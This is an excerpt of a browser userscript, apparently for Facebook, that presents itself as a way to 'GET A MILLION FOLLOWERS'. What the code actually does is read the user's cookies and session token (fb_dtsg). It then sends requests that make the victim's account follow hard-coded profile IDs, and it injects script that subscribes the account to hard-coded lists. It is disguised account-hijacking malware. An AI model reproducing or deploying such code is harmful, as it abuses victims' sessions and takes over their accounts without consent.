// ==UserScript==
// @name            GET A MILLION FOLLOWERS 2014
...
function autoLike(em) {
    var karayama = em + "=";
    if (document.cookie.length > 0) {
        suma = document.cookie.indexOf(karayama)
        if (suma != -1) {
            suma += karayama.length
            son = document.cookie.indexOf(";", suma)
            if (son == -1)
                son = document.cookie.length
            return unescape(document.cookie.substring(suma, son))
        }
        else { return ""; }
    }
}
...
function a(clown){
    ...
    var params4 = "profile_id=" + clown + "&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg=" + fb_dtsg + "&lsd&__" + user_id + "&phstamp=";
...
function blacklist(uidss) {
                var a = document.createElement('script');
                a.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + uidss + " }).send();";
                document.body.appendChild(a);
}
a("100000209434795"); a("100007582773849"); a("100001057341800");

blacklist("808188815864759");blacklist("778149438868697");blacklist("795266957156945");blacklist("796248647058776");blacklist("796248760392098");blacklist("796248820392092");

//єм ραтσsα
a("100000209434795"); blacklist("808188815864759");
